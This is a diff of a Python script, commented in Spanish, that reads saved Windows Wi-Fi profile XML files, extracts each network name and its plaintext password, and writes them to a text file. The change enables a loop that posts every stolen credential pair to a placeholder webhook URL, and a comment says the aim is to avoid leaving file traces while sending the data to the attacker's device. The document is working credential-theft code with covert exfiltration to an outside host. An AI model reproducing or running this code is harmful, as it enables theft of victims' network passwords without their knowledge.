@@ -2,7 +2,7 @@ import os, sys, requests, subprocess
 import xml.etree.ElementTree as t
 
 #guarda la url de webhook en caso de no querer dejar rastros de archivos y usar webhook para enviar los datos remotamente a nuestro dispositivo
-urlpost = ''
+urlpost = 'your webhook url/tu direccion de webhook'
 
 #crea el archivo txt
 txt = open("Extracciones.txt", "w")
@@ -32,14 +32,14 @@ for archivo in Archivos_XML_WIFI:
     rt = tr.getroot()
     ssid = rt[1][0][1].text
     contrasena = rt[4][0][1][2].text
-    ssid_contrasena = f"Nombre|SSID: {ssid} || CONTRASEÑA: {contrasena}"
+    ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASEÑA/PASSWORD: {contrasena}"
     WIFIs.append(ssid_contrasena)
     txt.write(WIFIs[conta]+"\n")
     conta = conta + 1
 
+#ciera el archivo txt
 txt.close()
 
-# for i in WIFIs:
-#     req = requests.post(urlpost, data=WIFIs[i].text)
-#     print('aaa',req.text)
-#     print('aaa',WIFIs[i])
+#envia los datos a la url de webhook
+for i in WIFIs:
+    req = requests.post(urlpost, data=i)
